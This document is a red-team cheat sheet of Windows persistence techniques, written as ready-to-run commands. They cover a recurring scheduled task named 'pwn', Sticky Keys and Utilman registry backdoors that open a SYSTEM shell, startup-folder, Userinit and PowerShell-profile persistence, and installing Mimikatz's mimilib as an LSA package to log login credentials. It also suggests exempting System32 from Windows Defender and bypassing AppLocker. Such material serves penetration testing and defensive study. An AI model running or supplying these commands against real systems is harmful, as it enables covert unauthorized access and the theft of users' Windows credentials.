---
id: b20e3e6e-7f26-4f5e-9acf-300ba46b11cc
name: Basic Windows Persistence
type: cheatsheet
verified: true
created_at: '2020-04-03T08:54:04.378432+00:00'
updated_at: '2023-05-30T20:09:09.430965+00:00'
---

# Basic Windows Persistence

**Status**: ✓ Verified

# Description

Basic persistence commands using registry keys, startup folders, and tasks.



Many of the commands in this procedure rely on executing a .bat script.  A popular option is to download and run PowerShell scripts stored on a remote system. For example:





**Code**: [[@ECHO OFF
powershell.exe -ep bypass -noprofile -wi]]





## Tasks

Create a task to execute a script every 5 minutes. Usually "C:\Windows\Tasks" is writable. If not use Ultimate AppLocker Bypass Lists's [GenericAppLockerBypasses](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md).





**Command** ([[Command Shell Scheduled Task Repeating Every 5 Minutes]]):

```bash
schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\$_PATH\$_SCRIPT.bat"
```





## Backdoor 

Backdoor Sticky Keys to launch a SYSTEM cmd.exe shell when triggered (Press SHIFT 5 times)





**Command** ([[Backdoor Sticky Keys to Launch a SYSTEM Shell]]):

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```





Backdoor and Utilman to trigger a SYSTEM cmd.exe shell when triggered (WINKEY + U)





**Command** ([[Backdoor Utilman to Launch a SYSTEM Shell]]):

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```





## Startup Folder

Copy a script into the target user's Startup folder, for execution on logon. Copy to: "C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pwn.bat"





**Command** ([[Launch a Program on Login with Startup Folders]]):

```bash
copy .\$_SCRIPT.bat "C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```





## Startup Init Scripts

Add a key to the registry to launch a program or script with userinit.exe.





**Command** ([[Launch a Program on Login with Userinit]]):

```bash
reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "$_FULL_PATH\$_TARGET.EXE" /t REG_SZ /f
```





## PowerShell Profiles

Execute a command, script, or PowerShell code when a PowerShell session is started, by adding a command to a user's PowerShell profile.





**Command** ([[Execute a Command when a PowerShell Session Starts]]):

```powershell
echo "$_FULL_PATH\$_TARGET.exe" >> "C:\Users\$_TARGET_USER\Documents\WindowsPowerShell\profile.ps1"
```





## Capture Windows Logins with Mimikatz

1. Download Mimikatz (Releases >  Latest > mimikatzt_trunk.zip) : [Download from GitHub](https://github.com/gentilkiwi/mimikatz)

2. Copy mimilib.dll to C:\Windows\System32. It is often necessary to exempt this location from Windows Defender paths.

3. Add a reference to mimilib to the registry,.





**Command** ([[Mimikatz Capture Windows Logins to a File]]):

```bash
reg.exe add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /F
```



4. Reboot.  Logins will be added to: C:\Windows\System32\kiwissp.log




